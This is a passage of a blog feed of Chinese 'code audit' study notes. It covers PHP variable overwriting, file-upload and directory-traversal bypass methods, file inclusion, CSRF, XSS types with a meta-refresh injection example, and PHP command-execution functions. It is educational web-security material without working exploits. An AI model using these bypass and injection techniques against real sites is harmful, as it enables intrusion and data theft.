变量将会以数组元素的形式存入到这个数组，作为替代</code></pre><h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><pre><code>bool import_request_variables ( string $type [, string $prefix ] )$type 指定需要导入的变量。可以用字母‘G&#39;、‘P&#39;和 ‘C‘分别表示GET、POST和Cookie$prefix 变量名前缀</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;变量覆盖&quot;&gt;&lt;a href=&quot;#变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;变量覆盖&quot;&gt;&lt;/a&gt;变量覆盖&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day9</title>
    <link href="http://lingxin16.github.io/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/"/>
    <id>http://lingxin16.github.io/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/</id>
    <published>2020-03-25T13:49:57.000Z</published>
    <updated>2020-03-25T14:53:53.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><a id="more"></a><p>服务端：</p><p>1.黑白名单过滤</p><p>2.修改MIME类型</p><p>3.截断上传攻击</p><p>4..htaccess文件攻击</p><p>5.目录验证</p><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>目录穿越(Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上,任意地存取被限制的文件夹、执行命令或查找数据。目录穿越攻击,也有人称为Path Traversal攻击。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>进行URL编码</p><p>进行16位Unicode编码</p><p>进行双倍URL编码</p><p>进行超长UTF-8 Unicode编码</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含漏洞的产生原因是在通过引入文件时,引用的文件名用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时,就形成的本地文件包含漏洞,被包涵的文件在第三方服务是,就形成了远程文件包含漏洞。</p><p>模块加载、cache调用,传入的参数拼接包含路径</p><p>include()<br>使用此函数,只有代码执行到此函数时才将文件包含进来,发生错误时只警告并继续执行。</p><p>inclue_once0<br>功能和前者一样,区别在于当重复调用同- -文件时,程序只调用一次。</p><p>require()<br>使用此函数,只要程序执行,立即调用此函数包含文件,发生错误时,会输出错误信息并<br>立即终止程序。</p><p>require_once()<br>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 </p><h3 id="远程包含利用方式"><a href="#远程包含利用方式" class="headerlink" title="远程包含利用方式"></a>远程包含利用方式</h3><p><img src="/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/QQ%E6%88%AA%E5%9B%BE20200325223345.jpg" alt="QQ截图20200325223345"></p><h2 id="任意文件读取及删除"><a href="#任意文件读取及删除" class="headerlink" title="任意文件读取及删除"></a>任意文件读取及删除</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p><img src="/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/QQ%E6%88%AA%E5%9B%BE20200325224125.jpg" alt="QQ截图20200325224125"></p><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>unlike()</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文件上传绕过&quot;&gt;&lt;a href=&quot;#文件上传绕过&quot; class=&quot;headerlink&quot; title=&quot;文件上传绕过&quot;&gt;&lt;/a&gt;文件上传绕过&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day8</title>
    <link href="http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/"/>
    <id>http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/</id>
    <published>2020-03-24T14:14:53.000Z</published>
    <updated>2020-03-24T14:41:56.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><a id="more"></a><p>CSRF ( Cross-site request forgery )跨站请求伪造,也有人写出XSRF。黑客伪造用户的HTTP请求。然后将这个HTTP请求发送给存在CSRF的网站,有CSRF的网站执行了伪造的HTTP请求,就引发了跨站请求伪造</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSRF漏洞&quot;&gt;&lt;a href=&quot;#CSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;CSRF漏洞&quot;&gt;&lt;/a&gt;CSRF漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day7</title>
    <link href="http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/"/>
    <id>http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/</id>
    <published>2020-03-23T13:23:41.000Z</published>
    <updated>2020-03-23T14:08:59.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><a id="more"></a><p>跨站脚本攻击( Cross Site Scripting )是指攻击者利用网站程序对用户输入过滤不足,输入可以显示在页面上对其他用户造成影响的HTML代码,从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表( Cascading Style Sheets )的缩写CSS区分开,跨站脚本攻击通常简写为XSS。</p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>搜索内容</p><p>发表文章</p><p>评论回复</p><p>资料设置</p><p>留言</p><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><p>反射型</p><p>存储型</p><p>DOM型</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>​    非持久型,也叫反射型XSS。通过GET和POST方法,向服务器端输入数据。用户输入的数据通常被放置在URL的query string中,或者是form数据中。如果服务器端对输入的数据不进行过滤,验证或编码,就直接将用户输入的信息直接呈现给客户，则可能会造成反射型XSS。</p><p>​    反射型XSS是比较普遍的XSS ,其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重,如在输入框的name中输入<meta http-equiv="refresh" content="5"> ,服务器不加处理,将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。</p><p>常见场景:<br>●将前端获取的内容,直接输出到浏览器页面<br>●将前端获取的内容,直接输出到HTML标签<br>●将前端获取的内容，直接输出到<script>标签</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>​    持久型,也叫存储型XSS,通常是因为服务器端将用户输入的恶意脚本没有通过验证就直接存储在数据库,并且每次通过调用数据库的方式,将数据呈现在浏览器上。则该XSS跨站脚本攻击将一直存在。若其他用户访问该页面,则恶意脚本就会被触发,用于盗取其他用户的私人信息。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>​    DOM ,全称Document Object Model ,是一个平台和语言都中立的接口,可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。<br>DOM型XSS其实是一种特殊类型的XSS ,它是基于DOM文档对象模型的一种漏洞。</p></script></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;XSS漏洞&quot;&gt;&lt;a href=&quot;#XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;XSS漏洞&quot;&gt;&lt;/a&gt;XSS漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day6</title>
    <link href="http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/"/>
    <id>http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/</id>
    <published>2020-03-22T13:40:26.000Z</published>
    <updated>2020-03-22T14:19:42.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><a id="more"></a><p>命令注入是一种攻击，目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单、cookie、HTTP头等）传递给系统shell时，命令注入攻击是可能的。在这种攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的特权执行。命令注入攻击可能很大程度上是由于输入验证不足。</p><h3 id="命令执行和代码执行的区别"><a href="#命令执行和代码执行的区别" class="headerlink" title="命令执行和代码执行的区别"></a>命令执行和代码执行的区别</h3><p>代码执行：执行的效果完全受限于语言本身</p><p>命令执行：执行的效果不受限于语言语法本身，不受命令本身限制</p><h3 id="命令执行类型："><a href="#命令执行类型：" class="headerlink" title="命令执行类型："></a>命令执行类型：</h3><blockquote><p>1.代码层过滤不严</p><p>2.系统漏洞</p><p>3.第三方组件存在代码执行漏洞</p></blockquote><p>常见函数：</p><p>system函数<br>passthru函数<br>Exec函数<br>Shell_exec函数<br>“</p><p>1.system函数</p><p>string system( string $command[,int &amp;$return_var] )</p><p>$command 要执行的命令</p><p>$return_var 如果提供此参数，则外部命令执行后的返回状态将会被设置到此变量中</p><p>2.passthru函数</p><p>string passthru ( string $command [, int &amp;$return_var] )</p><p>$command 要执行的命令</p><p>$return_var 如果提供此参数，Unix命令的返回状态会被记录到此参数</p><p>3.Exec函数</p><p>string exec ( string $command [,  array &amp;$output [, int &amp;$return var ]] )</p><p>$command 要执行的命令</p><p>$output 如果提供此参数，会有命令执行的输出填充此数组</p><p>$return_ var如果同时提供$output和$return_var参数，命令执行后的返回状态会被写入到此变量</p><p>4.Shell_exec函数</p><p>string shell_exec ( string $cmd )</p><p>$cmd 要执行的命令</p><p>反引号(`)则调用此函数</p><p>5.过滤函数</p><p>Escapeshellcmd() 过滤整条命令</p><p>Escapeshellarg() 过滤整个参数</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;命令执行漏洞&quot;&gt;&lt;a href=&quot;#命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;命令执行漏洞&quot;&gt;&lt;/a&gt;命令执行漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
